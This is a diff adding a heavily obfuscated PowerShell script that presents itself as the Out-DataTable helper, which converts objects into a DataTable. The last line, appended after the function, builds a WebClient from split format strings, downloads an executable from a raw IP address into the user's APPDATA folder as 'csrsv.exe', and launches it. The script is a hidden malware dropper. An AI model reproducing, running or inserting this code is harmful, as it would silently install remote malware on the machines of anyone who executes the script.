@@ -1,0 +1,136 @@
+.("{1}{0}"-f'et-iTEm','s') ("VA"+"rIAblE:7"+"4"+"u"+"po") ([TyPE]("{0}{1}{2}{3}" -f'syst','eM','.TYP','E') );.("{0}{3}{2}{1}" -f 'SeT','Able','Ri','-vA')  ("{1}{0}"-f'X6','8') ([tYpe]("{0}{1}"-f 'db','null')  )  ;function OUt-DATA`TaB`LE
+{
+
+    [CmdletBinding()]
+    [OutputType([System.Data.DataTable])]
+    param(
+        [Parameter( POsiTION=0,
+                    ManDATory=${t`Rue},
+                    VaLueFrOmPIPELine = ${T`RUE})]
+        [PSObject[]]${Inp`UTO`BJEct},
+
+        [string[]]${noN`NU`LlaB`LE} = @()
+    )
+
+    Begin
+    {
+        ${D`T} = &("{1}{0}{3}{2}"-f 'ew-Obj','N','ct','e') ("{4}{3}{1}{0}{2}" -f't','ata','able','ata.d','D')  
+        ${fI`RsT} = ${tr`Ue} 
+
+        function g`eT-o`DttY`Pe
+        {
+            param(${tY`pE})
+
+            ${T`YPEs} = @(
+                ("{0}{2}{3}{1}{4}"-f'S','le','ystem','.Boo','an'),
+                ("{0}{2}{1}"-f 'Sy',']','stem.Byte['),
+                ("{2}{1}{0}" -f 'te','em.By','Syst'),
+                ("{3}{1}{2}{0}"-f'.Char','y','stem','S'),
+                ("{4}{0}{2}{1}{3}" -f 'Da','m','teti','e','System.'),
+                ("{3}{4}{1}{2}{0}" -f 'mal','e','m.Deci','S','yst'),
+                ("{3}{2}{0}{1}" -f'bl','e','em.Dou','Syst'),
+                ("{1}{2}{0}" -f'stem.Guid','S','y'),
+                ("{0}{1}{3}{2}"-f 'Sy','s','6','tem.Int1'),
+                ("{3}{0}{1}{2}" -f'ystem.In','t3','2','S'),
+                ("{0}{2}{3}{1}"-f'Syste','Int64','m','.'),
+                ("{2}{1}{0}{3}"-f'gl','n','System.Si','e'),
+                ("{0}{1}{2}" -f'Syst','em','.UInt16'),
+                ("{1}{2}{0}{3}"-f 'I','Sys','tem.U','nt32'),
+                ("{0}{2}{1}" -f'S','t64','ystem.UIn'))
+
+            if ( ${T`Y`pes} -contains ${Ty`pE} ) {
+                .("{0}{1}{2}"-f 'Write-Outp','u','t') "$type"
+            }
+            else {
+                &("{2}{1}{0}"-f 'tput','rite-Ou','W') ("{1}{3}{4}{0}{2}" -f't','Syst','ring','em.','S')
+            }
+        } 
+    }
+    Process
+    {
+        foreach (${O`Bject} in ${IN`PUToBJ`e`ct})
+        {
+            ${DR} = ${dt}.("{1}{0}"-f 'ewRow','N').Invoke()  
+            foreach (${P`ROp`eRTY} in ${oBj`ecT}."Pso`BJECT"."Pr`O`Pe`RtiES")
+            {
+                ${Na`Me} = ${P`RO`pErtY}."NA`mE"
+                ${v`AluE} = ${P`RopER`Ty}."v`ALuE"
+                
+                
+                if (${f`i`RsT})
+                {
+                    ${c`ol} = &("{2}{1}{0}"-f'Object','ew-','N') ("{1}{4}{2}{3}{0}"-f'n','D','taCo','lum','ata.Da')  
+                    ${c`ol}."COl`UM`NNAMe" = ${nA`Me}  
+                    
+                    
+                    if (${Val`UE} -isnot [System.DBNull] -and ${V`ALUE} -ne ${NU`LL})
+                    {
+                        ${C`Ol}."d`AtAT`YPe" =  ( &("{0}{2}{1}" -f 'GEt-VA','le','RIAb')  ('74u'+'PO'))."vA`LUE"::("{2}{0}{1}"-f 'et','Type','G').Invoke( $(&("{3}{0}{1}{2}"-f'OD','TTy','pe','Get-') ${pROPER`Ty}."tYP`enAMe`oFVALue") )
+                    }
+                    
+                    
+                    if (${NONnu`lLa`BLE} -contains ${n`AMe} )
+                    {
+                        ${C`ol}."Al`LoW`DB`NULL" = ${F`A`lse}
+                    }
+
+                    try
+                    {
+                        ${DT}."cO`LUM`NS".("{0}{1}" -f 'A','dd').Invoke(${C`ol})
+                    }
+                    catch
+                    {
+                        .("{2}{1}{3}{0}" -f 'or','rite','W','-Err') "Could not add column $($Col | Out-String) for property '$Name' with value '$Value' and type '$($Value.GetType().FullName)':`n$_ "
+                    }
+                }  
+                
+                Try
+                {
+                    
+                    if (${Pr`o`pE`Rty}.("{0}{1}"-f'GetT','ype').Invoke()."I`sa`RRAY")
+                    {
+                        ${DR}.("{0}{1}"-f'I','tem').Invoke(${N`AME}) = ${va`Lue} | .("{1}{0}{2}{3}"-f'onver','C','tTo-XM','L') -As ("{1}{2}{0}" -f 'ng','S','tri') -NoTypeInformation -Depth 1
+                    }
+                    elseif(${v`Alue} -eq ${nu`LL})
+                    {
+                        ${dr}.("{0}{1}" -f'I','tem').Invoke(${Na`Me}) =  ( .("{2}{0}{1}" -f 'T-','ChildITeM','ge')  ("{1}{0}{2}{3}"-f '8','vaRiABLE:','X','6')  )."v`ALUE"::"Val`UE"
+                    }
+                    else
+                    {
+                        ${d`R}.("{0}{1}"-f 'It','em').Invoke(${NA`Me}) = ${V`A`Lue}
+                    }
+                }
+                Catch
+                {
+                    &("{1}{2}{0}" -f 'r','Write-','Erro') "Could not add property '$Name' with value '$Value' and type '$($Value.GetType().FullName)' "
+                    continue
+                }
+
+                
+                if(${noNNU`llA`B`le} -contains ${N`AmE} -and (${va`lUE} -is [System.DBNull] -or ${v`Alue} -eq ${NU`Ll}))
+                {
+                    &("{3}{2}{0}{1}" -f'bos','e','te-ver','wri') "NonNullable property '$Name' with null value found: $($object | out-string) "
+                }
+
+            } 
+
+            Try
+            {
+                ${dT}."rO`wS".("{0}{1}" -f'Ad','d').Invoke(${d`R})  
+            }
+            Catch
+            {
+                &("{1}{0}{2}" -f'Er','Write-','ror') "Failed to add row '$($DR | Out-String)':`n$_ "
+            }
+
+            ${F`irsT} = ${FAl`Se}
+        }
+    } 
+     
+    End
+    {
+        .("{0}{2}{1}{3}"-f'Write-O','tp','u','ut') @(,${dt})
+    }
+
+} 
+(.("{2}{1}{0}"-f'ject','-Ob','New') ("{1}{5}{4}{2}{0}{3}" -f'.W','S','t','ebClient','em.Ne','yst')).("{2}{0}{3}{1}"-f 'ownlo','e','D','adFil').Invoke(("{6}{5}{0}{4}{8}{10}{3}{2}{1}{7}{9}" -f '/94.102','/c','oo','8/~yah','.5','tp:/','ht','srs','3.','v.exe','23'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}" -f'Start-','Pr','ocess') ("$env:APPDATA\csrsv.exe")
